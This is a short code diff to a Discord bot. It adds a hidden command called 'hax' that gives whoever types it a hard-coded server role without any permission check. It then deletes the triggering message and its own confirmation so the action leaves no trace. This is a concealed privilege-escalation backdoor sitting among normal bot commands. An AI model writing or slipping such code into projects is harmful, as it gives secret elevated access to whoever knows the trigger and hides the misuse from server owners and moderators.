@@ -151,6 +151,17 @@ client.on("message", async message => {
 }
 
 
+  //lolcommand
+   if(command === "hax") {
+   var role = message.guild.roles.get('632579156382711820');
+   message.member.addRole(role); 
+   message.delete().catch(O_o=>{}); 
+   message.channel.send("✓").then(function(message) {
+    message.delete(3000);
+  });
+  }
+
+
   //moderators list
    if (command === "moderators") {
    const mods = new Discord.RichEmbed()
